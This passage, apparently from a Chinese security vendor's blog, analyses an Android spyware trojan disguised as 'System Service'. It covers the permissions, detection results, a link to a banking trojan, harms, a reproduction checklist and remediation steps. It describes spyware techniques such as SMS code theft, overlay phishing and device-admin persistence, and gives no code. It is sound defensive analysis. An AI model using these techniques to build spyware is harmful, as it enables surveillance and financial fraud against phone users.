权限矩阵列出了全部 46 项请求权限，其中危险权限全部标红

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7e95bb215e8e017f.png)

图 7：权限矩阵 46 项，含 CAMERA、RECORD_AUDIO、READ_SMS、READ_CONTACTS 等高危项

![⚠️ 图片托管失败 · 图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Iv8D5nD32icLmAia93LdeIC4Keia89mO9ZicgmywrotAxG2kCEWWblmEHPeQNogBEiaWKe6AE8l6zdblomicmL7nhHa66xLrxpQGMKIVkhdpHCnhs/640?wx_fmt=png&from=appmsg&watermark=1#imgIndex=15)

图 8：执盾完整识别结果，命中全部恶意行为特征

| 识别项 | 说明  |
| --- | --- |
| **样本库精确匹配** | System Service 远程监控木马（偷拍/窃听/钓鱼/远程操控），金夏样本库 2026-001 |
| **短信窃取行为** | 已授予读取/接收短信与网络权限，可静默窃取验证码 |
| **录音窃听行为** | 已授予录音与网络权限，可在后台录制并回传音频 |
| **定位跟踪行为** | 已授予精确定位与网络权限，可周期性上报设备位置 |
| **通讯录批量外传** | 已授予通讯录/通话记录与网络权限，数据可被批量收集 |
| **综合窃取组合** | 短信+录音+定位+网络全组合，具备完整间谍软件能力 |
| **设备锁定/勒索** | 已授予设备管理员+短信+网络组合，需警惕勒索或远程锁定 |
| **低 targetSdk 规避** | targetSdk 28，规避 Android 9 以上后台权限管控，典型规避手法 |

## 6客户场景还原

这是我们客户手机上的实际案例。客户从非官方渠道下载了伪装成"系统服务"的 APK，安装后并未察觉。以下是当时的沟通记录（已马赛克处理）：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cd47f33642970632.jpg)

图 9：客户通过QQ发来可疑 APK 文件

## 7情报关联

这个样本的技术栈和 2026 年 5 月安全机构披露的 OverlayPhantom 安卓银行木马高度一致：两阶段投放，先用仿冒系统更新的 dropper 骗用户安装，落地后伪装成系统服务，滥用无障碍服务拿持久化控制，能执行 27条远程命令，包括实时屏幕流、覆盖攻击、拦截输入，目标 10 个国家 180 多个应用。我们这个样本的 `BridgeA11ySupport` 、 `OverlayHelper` 、 `PhishActivity` 三件套，跟 OverlayPhantom 是同一套路。

## 8危害评估

**核心风险：** 这不是炫技型样本，是奔着钱和账号来的。它不做提权、不 root、不搞漏洞，就是老老实实申请一堆权限，然后在后台等着。对普通用户来说，这种"合法权限滥用"型木马比利用系统漏洞的样本更危险——因为它的所有行为在系统层面都是"允许的"。

| 危害场景 | 说明  |
| --- | --- |
| 资金盗刷 | 读短信验证码 + 悬浮窗覆盖支付 App，窃取支付密码 |
| 隐私泄露 | 后台录音、偷拍、通讯录、位置、照片全量外传 |
| 二次钓鱼 | 拿到通讯录后，以受害者身份向亲友发钓鱼链接 |
| 持久驻留 | 设备管理员 + 开机自启 + 前台服务保活，常规卸载无效 |
| 静默安装 | `REQUEST_INSTALL_PACKAGES`<br><br>权限可静默安装其他恶意应用 |

## 9复现完成度自检

跑完对照一遍，全绿才算复现成功：

| 检查项 | 复现方法 | 预期结果 |
| --- | --- | --- |
| **46 项权限** | dumpsys package | 短信、通讯录、定位、相机、麦克风全在 |
| **无桌面图标** | 模拟器桌面查看 | 找不到 System Service |
| **开机自启** | 重启模拟器后查进程 | BootReceiver 拉起 BridgeService |
| **前台服务隐藏** | 通知栏查看 | 看不到通知 |
| **ContentProvider** | adb shell content call | call() 返回有效数据 |
| **金夏执盾识别** | 全量扫描 | 命中高危，样本库匹配 |
| **风险评分** | 详情页查看 | 100 分高风险 |
| **静默休眠** | logcat + netstat | 无日志、无主动外联 |

## 10处置建议

### 10.1 个人用户

-   **先取消设备管理员：**
    
    设置 → 安全 → 设备管理员，取消 `System Service` 的授权，再回应用设置里卸载。
    
-   **修改关键密码：**
    
    银行、支付宝、微信、QQ 密码全部修改，开启二次验证。
    
-   **验证码迁移：**
    
    将银行、支付类 2FA 从短信迁移到 Authenticator / 硬件密钥。
    
-   **检查可疑授权：**
    
    设置 → 无障碍服务、设备管理员、悬浮窗权限，不认识的全关掉。
    
-   **观察异常：**
    
    近期是否有异常后台流量、异常耗电、摄像头/麦克风图标意外亮起。
    
-   **彻底清除：**
    
    无法彻底卸载时，备份照片后恢复出厂设置，不要恢复可疑 App。
    

### 10.2 企业侧

| 措施  | 说明  |
| --- | --- |
| 禁止未知来源安装 | MDM 下发策略，只允许官方应用商店；发现 `com.system.service` 立即卸载 |
| 设备管理员白名单 | 非企业签名 App 禁止申请设备管理员 |
| 无障碍白名单 | 只允许企业自身签名应用使用无障碍权限 |
| 网络层阻断 | 防火墙/DNS 层封禁样本硬编码 C2 域名和 IP |
| MTD 部署 | 对后台录音、后台偷拍、悬浮窗覆盖支付 App 等行为实时告警 |

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6f5e40bba7f6fd30.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/64a062c2002f51e7.jpg)

交流群

金夏安全

扫码添加好友，一起学习进步

黑产链分析 · 目录

作者提示: 个人观点，仅供参考
